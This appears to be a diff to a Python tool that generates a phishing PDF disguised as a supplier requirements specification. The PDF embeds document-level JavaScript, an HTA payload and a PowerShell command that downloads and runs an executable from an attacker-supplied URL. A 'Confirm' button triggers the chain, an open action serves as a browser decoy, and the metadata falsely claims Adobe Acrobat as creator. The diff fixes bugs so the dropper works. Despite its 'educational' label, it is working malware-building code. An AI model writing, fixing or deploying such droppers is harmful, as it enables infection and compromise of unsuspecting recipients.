@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-V303 "THE SUPPLIER CONFIRMATION" – REPORTLAB + PIKEPDF HYBRID (FINAL)
+V303 "THE SUPPLIER CONFIRMATION" – REPORTLAB + PIKEPDF HYBRID (FINAL FIXED)
 ================================================================================
 (c) 2026 The Architect. For Educational and Defensive Research Only.
 ================================================================================
@@ -22,7 +22,7 @@ from reportlab.pdfgen import canvas
 from reportlab.lib import colors
 from reportlab.platypus import Table, TableStyle
 import pikepdf
-from pikepdf import String, Array, Dictionary, Name, Stream
+from pikepdf import String, Array
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger("V303_SUPPLIER_CONFIRMATION")
@@ -51,7 +51,7 @@ End Sub
 </script></head><body></body></html>'''
 
 def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, supplier, product, version, button_label):
-    # ------ Prepare payloads ------
+    # Prepare payloads
     ps_cmd = (
         f'$u="{exe_url}";'
         f'$p="$env:TEMP\\{os.path.basename(exe_url)}";'
@@ -66,7 +66,7 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     hta_b64 = base64.b64encode(hta_content.encode('utf-8')).decode('ascii')
     hta_filename = f"{random_str(4)}.hta"
 
-    # ------ JavaScript (document‑level) ------
+    # JavaScript document‑level function
     js_code = f"""
     function b64Decode(data) {{
         var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -169,7 +169,7 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     } catch(e) {}
     """
 
-    # ------ Step 1: Build base PDF with reportlab ------
+    # ---------- Step 1: Generate base PDF with reportlab ----------
     with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
         base_pdf_path = tmp.name
 
@@ -177,31 +177,26 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     width, height = A4
     margin = 50
 
-    # ----- Page 1 -----
-    # Header bar
+    # Page 1
     c.setFillColor(colors.HexColor("#0a1a33"))
     c.rect(0, height-20, width, 5, fill=1)
 
-    # Buyer box
     c.setFillColor(colors.HexColor("#d9e2ef"))
     c.rect(margin, height-40, 120, 30, fill=1, stroke=1)
     c.setFillColor(colors.HexColor("#0a1a33"))
     c.setFont("Helvetica-Bold", 12)
     c.drawString(margin+5, height-30, buyer[:15])
 
-    # Secured badge
     c.setFillColor(colors.HexColor("#d9e2ef"))
     c.rect(width-margin-100, height-45, 90, 25, fill=1, stroke=1)
     c.setFillColor(colors.HexColor("#0a1a33"))
     c.setFont("Helvetica-Bold", 8)
     c.drawString(width-margin-70, height-35, "Secured")
 
-    # Title
     c.setFillColor(colors.black)
     c.setFont("Helvetica-Bold", 24)
     c.drawString(margin, height-100, "Customization Requirements Specification")
 
-    # Body
     c.setFont("Helvetica", 12)
     c.drawString(margin, height-150, f"Dear {supplier} Team,")
     c.setFont("Helvetica", 11)
@@ -233,12 +228,11 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     y -= 20
     c.drawString(margin, y, f"Response Due: {expiry}")
 
-    # Footer
     c.setFont("Helvetica", 8)
     c.setFillColor(colors.gray)
     c.drawString(margin, 30, "This document contains proprietary information. Please confirm receipt and compliance.")
 
-    # ----- Page 2 -----
+    # Page 2
     c.showPage()
     c.setFont("Helvetica-Bold", 20)
     c.setFillColor(colors.black)
@@ -247,7 +241,6 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     c.setFillColor(colors.gray)
     c.drawString(margin, height-70, f"Document No.: {doc_no}  |  Date: {date_str}")
 
-    # Table data
     data = [
         ["Category", "Requirement", "Status", "Priority"],
         ["Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"],
@@ -280,66 +273,57 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     table.wrapOn(c, width-2*margin, height-200)
     table.drawOn(c, margin, height-170 - table._height)
 
-    # Footer
     c.setFont("Helvetica", 8)
     c.setFillColor(colors.gray)
     c.drawString(margin, 30, "Please confirm your ability to meet these requirements by clicking the button on page 1.")
     c.save()
     logger.info(f"[+] Base PDF generated: {base_pdf_path}")
 
-    # ------ Step 2: Add interactive elements with pikepdf ------
+    # ---------- Step 2: Add interactive elements with pikepdf ----------
     pdf = pikepdf.open(base_pdf_path)
 
-    # Add JavaScript name tree
-    pdf.Root[Name("/Names")] = pdf.make_indirect({
-        Name("/JavaScript"): pdf.make_indirect({
-            Name("/Names"): Array([
+    # JavaScript name tree – use plain strings for keys
+    pdf.Root["/Names"] = pdf.make_indirect({
+        "/JavaScript": pdf.make_indirect({
+            "/Names": Array([
                 String("trigger"),
-                pdf.make_indirect({Name("/JS"): String(js_code), Name("/S"): Name("/JavaScript")})
+                pdf.make_indirect({"/JS": String(js_code), "/S": "/JavaScript"})
             ])
         })
     })
 
-    # OpenAction (browser decoy)
-    pdf.Root[Name("/OpenAction")] = pdf.make_indirect({
-        Name("/S"): Name("/JavaScript"),
-        Name("/JS"): String(browser_js)
+    # OpenAction – browser decoy
+    pdf.Root["/OpenAction"] = pdf.make_indirect({
+        "/S": "/JavaScript",
+        "/JS": String(browser_js)
     })
 
     # Button on page 1 (index 0)
     page1 = pdf.pages[0]
-    button = Dictionary({
-        Name("/Type"): Name("/Annot"),
-        Name("/Subtype"): Name("/Widget"),
-        Name("/FT"): Name("/Btn"),
-        Name("/T"): String("ConfirmButton"),
-        Name("/Rect"): [100, 330, 495, 390],
-        Name("/F"): 4,
-        Name("/BS"): Dictionary({
-            Name("/S"): Name("/S"),
-            Name("/W"): 2,
-            Name("/BC"): [0.2, 0.5, 0.7]
-        }),
-        Name("/MK"): Dictionary({
-            Name("/BG"): [0.15, 0.45, 0.7],
-            Name("/CA"): String(button_label)
-        }),
-        Name("/AA"): Dictionary({
-            Name("/U"): Dictionary({
-                Name("/S"): Name("/JavaScript"),
-                Name("/JS"): String("this.doc.trigger();")
-            })
-        })
-    })
+    button = {
+        "/Type": "/Annot",
+        "/Subtype": "/Widget",
+        "/FT": "/Btn",
+        "/T": String("ConfirmButton"),
+        "/Rect": [100, 330, 495, 390],
+        "/F": 4,
+        "/BS": {"/S": "/S", "/W": 2, "/BC": [0.2, 0.5, 0.7]},
+        "/MK": {"/BG": [0.15, 0.45, 0.7], "/CA": String(button_label)},
+        "/AA": {
+            "/U": {"/S": "/JavaScript", "/JS": String("this.doc.trigger();")}
+        }
+    }
+    # Convert button dict to indirect object
+    button_obj = pdf.make_indirect(button)
     if page1.Annots:
-        page1.Annots.append(button)
+        page1.Annots.append(button_obj)
     else:
-        page1.Annots = Array([button])
+        page1.Annots = Array([button_obj])
 
     # Metadata
-    pdf.docinfo[Name("/Title")] = String(f"Customization Requirements – {product} (v{version})")
-    pdf.docinfo[Name("/Author")] = String(buyer)
-    pdf.docinfo[Name("/Creator")] = String("Adobe Acrobat Pro DC")
+    pdf.docinfo["/Title"] = String(f"Customization Requirements – {product} (v{version})")
+    pdf.docinfo["/Author"] = String(buyer)
+    pdf.docinfo["/Creator"] = String("Adobe Acrobat Pro DC")
 
     pdf.save(output_path, compress_streams=False)
     logger.info(f"[+] Final PDF saved: {output_path}")
